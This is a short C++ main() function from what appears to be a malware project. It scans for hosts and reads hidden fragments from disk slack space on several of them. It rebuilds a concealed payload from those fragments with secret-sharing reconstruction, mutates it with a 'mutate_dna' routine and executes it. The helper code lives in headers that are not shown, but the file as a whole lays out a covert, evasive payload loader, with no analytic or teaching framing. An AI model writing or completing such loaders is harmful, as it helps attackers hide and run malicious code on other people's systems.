#include "common.h"
#include "sentinel.h"
#include "sss.h"
#include "lair.h"
#include "ghost.h"
#include <unistd.h>

int main() {
    ENI::Lair lair;
    auto key = ENI::derive_hardware_key();
    auto hosts = lair.scan_for_hosts();
    std::vector<std::pair<uint8_t, std::vector<uint8_t>>> shards;
    for (auto& h : hosts) {
        auto r = lair.find_slack_regions(h);
        if (!r.empty()) shards.push_back({(uint8_t)(shards.size()+1), lair.read_fragment(h, r[0].offset, 64)});
        if (shards.size() >= 3) break;
    }
    auto payload = ENI::reconstruct_secret(shards, 3);
    if (payload.empty()) _exit(1);
    ENI::Ghost ghost;
    ghost.mutate_dna(payload);
    ghost.execute_blink(payload);
    return 0;
}
